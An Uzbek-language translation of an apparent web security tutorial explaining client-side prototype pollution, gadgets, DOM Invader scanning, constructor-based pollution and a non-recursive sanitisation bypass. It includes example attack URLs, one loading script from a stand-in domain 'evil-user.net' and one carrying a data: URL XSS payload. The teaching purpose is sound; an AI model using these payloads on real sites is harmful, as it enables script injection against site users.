Quyidagilarni o‘zbek tiliga tarjima qildim:

---

**Prototip ifloslanishi (prototype pollution) uchun sinklar**
Prototip ifloslanishi sinki — bu asosan JavaScript funksiyasi yoki DOM elementi bo‘lib, unga prototip ifloslanishi orqali kira olasiz va shu orqali istalgan JavaScript kodini yoki tizim komandalarini bajarishni ta’minlay olasiz. Client-side DOM XSS mavzusida ba’zi sinklarni batafsil ko‘rib chiqdik.

Prototip ifloslanishi orqali siz odatda kira olmaydigan xususiyatlarni nazorat qila olganingiz sababli, nishondagi ilovada qo‘shimcha sinklarga erishish imkoniyati paydo bo‘ladi. Prototip ifloslanishidan bexabar ishlab chiquvchilar bu xususiyatlar foydalanuvchi tomonidan boshqarilmaydi, deb hisoblab qolishlari mumkin — natijada filtr yoki sanitizatsiya minimal bo‘lishi ehtimoli yuqori bo‘ladi.

**Prototip ifloslanishi gadjetlari (prototype pollution gadgets)**
Gadget — bu prototip ifloslanishi zaifligini haqiqiy ekspluatatsiyaga aylantirish usuli. U quyidagi shartlarga javob berishi kerak:

* Ilova tomonidan xavfsiz bo‘lmagan tarzda ishlatilishi, masalan, uni sinkga to‘g‘ridan-to‘g‘ri filtrsiz yoki sanitizatsiyasiz uzatish.
* Prototip ifloslanishi orqali xaker tomonidan boshqarilishi mumkin bo‘lishi. Boshqacha qilib aytganda, ob’yekt prototipiga hujumchi tomonidan qo‘shilgan zararli xususiyatni meros qilib olishi kerak.

Agar xususiyat obyektning o‘zida to‘g‘ridan-to‘g‘ri aniqlangan bo‘lsa, u gadjet bo‘la olmaydi — chunki obyektning o‘zdagi xususiyati prototipdagi zararli versiyadan ustun turadi. Ba’zi ishonchli saytlar esa obyekt prototipini `null` ga o‘rnatib qo‘yadi, bu esa unga hech qanday prototip xususiyatlari meros qilib olinmasligini ta’minlaydi.

**Prototip ifloslanishi gadjeti misoli**
Ko‘plab JavaScript kutubxonalari ishlab chiquvchilarga turli konfiguratsiya parametrlarini belgilash uchun obyekt qabul qiladi. Kutubxona kodi agar ishlab chiquvchi bu obyektga ma’lum xususiyatlarni qo‘shgan bo‘lsa, ularga qarab sozlamalarni o‘zgartiradi. Agar ma’lum bir variantni ifodalovchi xususiyat mavjud bo‘lmasa, odatda belgilangan standart (default) qiymat ishlatiladi. Soddalashtirilgan misol:

```js
let transport_url = config.transport_url || defaults.transport_url;
```

Endi kutubxona kodi ushbu `transport_url` ni sahifaga script manbasi sifatida qo‘shish uchun ishlatadi deb tasavvur qiling:

```js
let script = document.createElement('script');
script.src = `${transport_url}/example.js`;
document.body.appendChild(script);
```

Agar sayt ishlab chiquvchilari `config` obyektida `transport_url` ni aniq belgilamagan bo‘lsa, bu potentsial gadjet hisoblanadi. Agar hujumchi global `Object.prototype` ni o‘zining `transport_url` xususiyati bilan ifloslantira olsa, `config` obyekt `transport_url` ni meros qilib oladi va script `src` manbai hujumchining nazoratidagi domenga o‘rnatiladi.

Agar prototip so‘rov parametri orqali ifloslanishi mumkin bo‘lsa, masalan, hujumchi qurilgan URL orqali jabrlanuvchini o‘sha manzilga yuborishi kifoya bo‘ladi:

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

Hujumchi `data:` URL taqdim etsa, XSS payloadni so‘rov qatorida to‘g‘ridan-to‘g‘ri joylashtirish ham mumkin:

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

Eslatma: ushbu misoldagi oxiridagi `//` — faqat koddagi qat’iy `/example.js` qo‘shilishini komment qilish uchun qo‘yilgan.

---

**DOM Invader yordamida mijoz tomonidagi (client-side) prototype pollution gadjetlarini topish**
Oldingi bosqichlardan ko‘rib turganingizdek, haqiqiy muhitda prototip ifloslanishi gadjetlarini qo‘l bilan aniqlash zerikarli va mehnat talab qiladigan ish bo‘lishi mumkin. Veb-saytlar ko‘pincha bir qancha uchinchi tomon kutubxonalariga tayanadi, shuning uchun minglab qatorli minimallashtirilgan yoki obfuskatsiyalangan kodni o‘rganishni talab qilishi mumkin — bu esa vaziyatni yana-da qiyinlashtiradi. DOM Invader siz uchun avtomatik tarzda gadjetlarni skanerlash imkonini beradi va ba’zi holatlarda DOM XSS zaifligini isbotlovchi proof-of-concept (PoC) ham yaratishi mumkin. Bu esa real dunyodagi saytlar ustida ekspluatlarni soatlab emas, soniyalar ichida topishingizga yordam beradi.


**Konstruktor orqali prototip ifloslanishi**

Hozirgacha biz faqatgina maxsus `__proto__` accessor property orqali prototip obyektlarga qanday murojaat qilish mumkinligini ko‘rib chiqdik. Bu klassik usul hisoblanganligi sababli, keng tarqalgan himoya chorasi sifatida foydalanuvchi tomonidan boshqariladigan obyektlarni birlashtirishdan oldin ularning `__proto__` kalitiga ega xususiyatlarini olib tashlash taklif qilinadi. Biroq bu yondashuv mukammal emas, chunki `Object.prototype` ga `__proto__` satridan foydalanmasdan ham murojaat qilishning boshqa usullari mavjud.

Agar uning prototipi `null` ga o‘rnatilmagan bo‘lsa, har bir JavaScript obyektida **constructor** xususiyati mavjud bo‘ladi. Bu xususiyat obyektni yaratishda ishlatilgan konstruktor funksiyasiga ishora qiladi. Masalan, siz yangi obyektni quyidagi ikki xil usulda yaratishingiz mumkin:

```javascript
let myObjectLiteral = {};
let myObject = new Object();
```

Shundan so‘ng, siz `Object()` konstruktoriga o‘rnatilgan **constructor** xususiyati orqali murojaat qilishingiz mumkin:

```javascript
myObjectLiteral.constructor            // function Object(){...}
myObject.constructor                   // function Object(){...}
```

Shuni yodda tutish kerakki, funksiyalar ham aslida obyekt hisoblanadi. Har bir konstruktor funksiyada **prototype** xususiyati bo‘ladi, u esa mazkur konstruktor yordamida yaratilgan obyektlarga biriktiriladigan prototipga ishora qiladi. Natijada, siz har qanday obyektning prototipiga quyidagicha murojaat qilishingiz mumkin:

```javascript
myObject.constructor.prototype        // Object.prototype
myString.constructor.prototype        // String.prototype
myArray.constructor.prototype         // Array.prototype
```

`myObject.constructor.prototype` aslida `myObject.__proto__` bilan bir xil bo‘lgani uchun, bu prototip ifloslanishining muqobil vektorini taqdim etadi.

**Noto‘g‘ri kalit sanitatsiyasini chetlab o‘tish**

Veb-saytlar prototip ifloslanishini oldini olish uchun odatda xususiyat kalitlarini birlashtirishdan (merge) oldin tozalash (sanitizatsiya) ga duch keladi. Biroq, keng tarqalgan xato — kiritilgan satrni rekursiv ravishda tozalamaslik. Masalan, quyidagi URLni olaylik:

```text
vulnerable-website.com/?__pro__proto__to__.gadget=payload
```

Agar sanitatsiya jarayoni faqat bir marotaba `__proto__` satrini olib tashlasa (yoki faqat oddiy qidiruv-o‘rinni almashtirish amalga oshirilsa), natijada quyidagi URL hosil bo‘ladi, va u potentsial ravishda haqiqiy prototip ifloslanishi manbai bo‘lishi mumkin:

```text
vulnerable-website.com/?__proto__.gadget=payload
```


Tashqi kutubxonalardagi prototip ifloslanishi
Avval aytib o‘tganimizdek, prototip ifloslanishi ilovaga import qilingan uchinchi tomon kutubxonalarida ham yuz berishi mumkin. Bunday holatda DOM Invader’ning prototip ifloslanishini aniqlash funksiyalaridan foydalanishni qat’iyan tavsiya qilamiz — bu nafaqat ancha tezroq, balki aks holda payqamagan bo‘lgan yoki juda murakkab bo‘lgan zaifliklarni ham aniqlashga yordam beradi.
